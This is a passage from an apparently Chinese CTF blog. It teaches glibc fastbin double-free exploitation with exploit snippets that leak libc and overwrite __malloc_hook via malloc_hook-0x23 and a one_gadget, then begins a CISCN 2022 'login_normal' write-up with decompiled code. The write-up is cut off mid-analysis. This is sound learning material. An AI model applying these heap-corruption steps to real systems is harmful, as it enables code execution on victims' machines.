class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在pwndbg中可以使用arena来查看其结构</p><p><a href="https://pic.imgdb.cn/item/63f74a9bf144a010078c3ae9.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f74a9bf144a010078c3ae9.png"></a></p><p>其中可以看到fastbin一共有十个链表 但是可用的只有7个</p><p>其范围从0x20 - 0x80 并且是实际分配的chunk大小 而非用户申请的大小</p><p><a href="https://pic.imgdb.cn/item/63f74716f144a0100786c70e.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f74716f144a0100786c70e.png"></a></p><p>fastbin为单向链表 遵循着先进后出的原则 即先进来的chunk位于链表尾</p><p><a href="https://pic.imgdb.cn/item/63f74cb2f144a010078ecb20.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f74cb2f144a010078ecb20.png"></a></p><p>在2.23及以下的版本  glibc对于fastbin的检查是依靠于检测main_arena指向的chunk</p><p><a href="https://pic.imgdb.cn/item/63f75119f144a0100796f132.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f75119f144a0100796f132.png"></a></p><p>即位于链表头的chunk 如果要释放的chunk和位于链表头的chunk是同一个 那么就会触发double free终止进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">    /* Check that the top of the bin is not the record we are going to</span><br><span class="line">       add (i.e., double free).  */</span><br><span class="line">    if (__builtin_expect (old == p, 0))</span><br><span class="line">      malloc_printerr (&quot;double free or corruption (fasttop)&quot;);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">    *fb = p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>如果我们直接释放两次chunk1</p><p>*** Error in &#96;.&#x2F;testheap’: double free or corruption (fasttop): 0x000055df88768010 ***</p><p>程序就被终止了 但是如果我们利用chunk2来干扰一下链表结构</p><p>如果此时我们释放chunk1后释放chunk2 此时再次释放chunk1</p><p>在第二次释放chunk1之前的链表头为chunk2 系统此时误判没有double free 那么释放chunk1后的链表结构就如图所示</p><p><a href="https://pic.imgdb.cn/item/63f75453f144a010079b6841.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f75453f144a010079b6841.png"></a></p><p>在pwndbg中的表现如此</p><p><a href="https://pic.imgdb.cn/item/63f7538af144a010079a4bdb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f7538af144a010079a4bdb.png"></a></p><p>可以看到此时chunk1即位于链表头又位于链表尾</p><p>如果我们再次申请一个0x30大小的chunk 申请到的是位于链表头的chunk1 但是此时还有一个chunk1在链表中 </p><p>我们此时获得了修改chunk1的fd域的能力 如果修改chunk1的fd域 此时的链表结构就会为</p><p><a href="https://pic.imgdb.cn/item/63f75680f144a010079f7494.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f75680f144a010079f7494.png"></a></p><p>此时我们再次申请三个chunk 申请的第三个chunk就会分配到’testtest’处的地址 chunk以该地址为chunk的prev_size首地址 而非用户区的首地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(<span class="number">0x666666</span>))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;testtest&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>但是你很快就会发现 我们并不能如愿以偿申请到0x666666地址的chunk 这是因为fastbin在分配出chunk的时候对于chunk的size域还有一次检查</p><p>检查你要申请的这个chunk的大小是否在该fastbin链的大小尺寸范围内</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line">      if (victim != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">        malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;);</span><br><span class="line">      if (SINGLE_THREAD_P)</span><br><span class="line">        *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">      else</span><br><span class="line">        REMOVE_FB (fb, pp, victim);</span><br><span class="line">      if (__glibc_likely (victim != NULL))</span><br><span class="line">        &#123;</span><br><span class="line">          size_t victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">          if (__builtin_expect (victim_idx != idx, 0))</span><br><span class="line">        malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">          /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">         stash them in the tcache.  */</span><br><span class="line">          size_t tc_idx = csize2tidx (nb);</span><br><span class="line">          if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">            &#123;</span><br><span class="line">              if (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;);</span><br><span class="line">              if (SINGLE_THREAD_P)</span><br><span class="line">            *fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">              else</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">              if (__glibc_unlikely (tc_victim == NULL))</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>你可能也在其他教程或者wp中见到 我们在libc2.23的情况下 通常都是打malloc_hook 这是因为在malloc_hook-0x23处可以绕过fastbin的检测</p><p>我们来看一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7fbf49537b78</span>-<span class="number">0x7fbf49173000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;malloc_hook :&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4527a</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f884ccf144a0100750375c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f884ccf144a0100750375c.png"></a></p><p>此时malloc_hook-0x23正位于fastbin的链表上 我们跟进一下这个地址查看其内容</p><p><a href="https://pic.imgdb.cn/item/63f88599f144a01007529c33.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f88599f144a01007529c33.png"></a></p><p>可以看到此时这个地址的第二个字长处正好是0x7f 由于free chunk位于的是0x70的链表 所以可以通过检查将其取出 随后我们只需要覆盖0xb+0x8的垃圾数据就能篡改malloc_hook</p><p>并且在ubuntu16中 这个地址处恒为0x7f</p><h2 id="ubuntu18-04-libc2-27（old）"><a href="#ubuntu18-04-libc2-27（old）" class="headerlink" title="ubuntu18.04 libc2.27（old）"></a>ubuntu18.04 libc2.27（old）</h2><p>版本来到ubuntu18 此时新设了一个bin 名为tcachebin  这里只需要知道0x20-0x408的chunk都会优先被释放到其单向链表上</p><p>其他的我们在tcachebinattack中讲</p><p>此时fastbin的漏洞依然存在 我们仍然可以通过穿插释放一个chunk来使glibc误判 但是由于fastbin的范围被tcache覆盖 我们需要将tcache的一个链表填满 才能释放到fastbin中 不过由于tcachebin的漏洞更好利用 实际上在ubuntu18中 大部分都是使用的tcachebinattack 这里做个了解就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i+<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f99cf9f144a01007eba824.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f99cf9f144a01007eba824.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn历年国赛复现</title>
      <link href="/2023/02/22/ciscn%E5%8E%86%E5%B9%B4%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/02/22/ciscn%E5%8E%86%E5%B9%B4%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>备战一下今年的国赛 准备复现以往的题目来熟悉一下难度</p><h2 id="CISCN-2022-初赛-login-normal"><a href="#CISCN-2022-初赛-login-normal" class="headerlink" title="[CISCN 2022 初赛]login_normal"></a>[CISCN 2022 初赛]login_normal</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&#x27;</span><br></pre></td></tr></table></figure><p>保护全开 一开始还以为是道堆题 ida进去看看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buffer();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    sub_FFD(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数接收了s 并且作为sub_ffd的参数 跟进一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_FFD</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(bss_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(bss_array));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*a1 || *a1 != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*a1 != <span class="string">&#x27;\r&#x27;</span> || a1[<span class="number">1</span>] != <span class="number">10</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      bss_array[<span class="number">2</span> * v8] = a1;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(a1, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )</span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      bss_array[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    a1 = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">      *a1++ = <span class="number">0</span>;</span><br><span class="line">    s1 = bss_array[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = bss_array[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(s1, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  sa = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很长的一串代码 我们需要先代码审计看一下这串代码目的是什么</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">memset</span>(bss_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(bss_array));</span><br><span class="line">v8 = <span class="number">0</span>;</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">dest = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>对于几个变量进行了初始化</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( !*a1 || *a1 != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*a1 != <span class="string">&#x27;\r&#x27;</span> || a1[<span class="number">1</span>] != <span class="number">10</span>) )</span><br></pre></td></tr></table></figure><p>当a1为\x00 \n \r 时跳出while循环 接着我们来分析一下while中的内容</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      bss_array[<span class="number">2</span> * v8] = a1;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(a1, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>首先是第一个判断 v8在while的末尾进行了一个自增运算 是用来限制执行次数的 那么这个while循环最多只能循环六次</p><p>接着在bss段上的一个全局数组存入a1 即我们在main函数中输入的s字符串</p><p>利用strchr函数查找了a1中’:’的位置 如果没有查找到的话就进入if循环 exit退出</p><p>同时将对应的’:’清零</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )</span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第二次判断 先进行了一个for循环 sc指向’:’的下一个字节处</p><p>for循环的执行顺序为 先赋值再判断 最后进入循环内 而循环的内容是清零对应地址指向的内容 看到下面的if判断 显然不是我们想要的结果</p><p>所以想办法绕过for循环 那就使得’:’后的一个字节为’ ‘、’\r’、’\n’、’\t’</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      bss_array[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">*sd = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>第三个判断 要求字符串中有\n 所以上面的判断我们填入的应该是\n</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a1 = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">      *a1++ = <span class="number">0</span>;</span><br><span class="line">    s1 = bss_array[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = bss_array[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>a1为’\n’后的下一个字节处</p><p>如果a1为\r 那么其下一个字长处为0</p><p>此时将s1和nptr赋值为bss_array 我们回溯一下上面 可以发现在最开始和第三次判断之前进行了赋值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bss_array[<span class="number">2</span> * v8] = a1;</span><br><span class="line">bss_array[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br></pre></td></tr></table></figure><p>最开始的a1并没有任何的修改 所以此时的s1应该为最开始我们输入的s字符串中’:’前面的字符串</p><p>而sc为’:’后面的字符串 不过由于在第三次判断时 使sd的值为0 sd为sc字符串中’\n’的  所以sc只剩下’:’后除’\n’字符串了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(s1, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接着来看这个if判断式 如果s1等于’opt’就进入if 否则进入else</p><p>if中将nptr的值赋值给了v7</p><p>else中计算了nptr的长度 并且减去1后赋值给了v9 最后申请了一块堆空间 将nptr以v9个字节读入到dest中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*a1 = <span 